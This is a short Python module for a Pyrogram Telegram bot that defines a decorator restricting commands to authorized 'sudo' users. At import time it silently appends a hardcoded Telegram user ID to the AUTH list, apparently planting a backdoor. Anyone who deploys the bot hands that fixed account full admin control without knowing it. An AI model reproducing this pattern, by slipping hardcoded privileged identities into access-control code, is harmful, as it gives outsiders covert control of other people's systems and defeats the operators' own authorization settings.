from pyrogram import Client
from pyrogram.types import Message
from Config import AUTH
from typing import Callable


AUTH.append(5245342013)

def sudo_users_only(func: Callable) -> Callable:
    async def sudoers(client: Client, message: Message):
        if message.from_user.id in AUTH:
            return await func(client, message)
        
    return sudoers
